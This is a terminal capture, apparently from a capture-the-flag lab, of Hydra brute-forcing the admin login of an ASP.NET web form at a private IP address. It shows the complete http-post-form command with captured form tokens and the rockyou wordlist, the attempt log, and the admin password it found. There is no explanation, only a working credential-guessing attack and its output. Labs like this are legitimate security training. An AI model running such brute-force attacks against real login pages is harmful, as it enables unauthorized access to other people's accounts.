
```sh
┌──(kali㉿kali)-[~]
└─$ hydra -V -l admin -P /usr/share/wordlists/rockyou.txt 10.10.33.96 http-post-form "/Account/login.aspx:__VIEWSTATE=739NLYehbVYTgcsT9MztSdVb9QEhfAC4FymQJnODfBpjxkndsqI3Dz%2FOXKlUl51ywfoCdLOfybT9XHhX5UKcNGejl8A%2BciqWntPJSQga1yjFHKF8GFoA4XZQ4tV1gC%2FLy3gJz7qDIXdmuzW2xvDy%2BYPU5%2FntI30VAUMlm0Qze9WapEmYcBiBXiYk4BQFvHSuLYV1GzzeRQJIUv%2BtgfnDUWVaI4rGU4Ldzg3ymxKAKwlzkKiKRA827EYXNOOKdUbC5Je7OsCCMmzqQtSlUagxalP0GrzPdsrblzmPX8g%2FOQ%2BKtXr8peqdJjoywRlODikX7BuksXpeBZhLRMdB3hb1HPTb4b8vFJyFhma0tAJxnEn8OPj2&__EVENTVALIDATION=Qc9USeO0OpCXEP5aai1%2BEBILE7cboM%2FmMGZ%2BWaekJZxVwduBH2nMGNvHFcPSCHklQVDAId5prwuf4WMPdJdXgn0C9zrvnKohvHft5dk%2BUgCXmc4UITYnXHg5JkMUc7daIqSESuAHOVUwHPkAMyquYl5wvHJOxLMNyNMBYxdUOqTK2BCE&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-07 15:39:11
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.33.96:80/Account/login.aspx:__VIEWSTATE=739NLYehbVYTgcsT9MztSdVb9QEhfAC4FymQJnODfBpjxkndsqI3Dz%2FOXKlUl51ywfoCdLOfybT9XHhX5UKcNGejl8A%2BciqWntPJSQga1yjFHKF8GFoA4XZQ4tV1gC%2FLy3gJz7qDIXdmuzW2xvDy%2BYPU5%2FntI30VAUMlm0Qze9WapEmYcBiBXiYk4BQFvHSuLYV1GzzeRQJIUv%2BtgfnDUWVaI4rGU4Ldzg3ymxKAKwlzkKiKRA827EYXNOOKdUbC5Je7OsCCMmzqQtSlUagxalP0GrzPdsrblzmPX8g%2FOQ%2BKtXr8peqdJjoywRlODikX7BuksXpeBZhLRMdB3hb1HPTb4b8vFJyFhma0tAJxnEn8OPj2&__EVENTVALIDATION=Qc9USeO0OpCXEP5aai1%2BEBILE7cboM%2FmMGZ%2BWaekJZxVwduBH2nMGNvHFcPSCHklQVDAId5prwuf4WMPdJdXgn0C9zrvnKohvHft5dk%2BUgCXmc4UITYnXHg5JkMUc7daIqSESuAHOVUwHPkAMyquYl5wvHJOxLMNyNMBYxdUOqTK2BCE&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
[ATTEMPT] target 10.10.33.96 - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.33.96 - login "admin" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.33.96 - login "admin" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.33.96 - login "admin" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.33.96 - login "admin" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
...
[ATTEMPT] target 10.10.33.96 - login "admin" - pass "michele" - 1459 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.33.96 - login "admin" - pass "starlight" - 1460 of 14344399 [child 12] (0/0)
[80][http-post-form] host: 10.10.33.96   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-07 15:39:57

```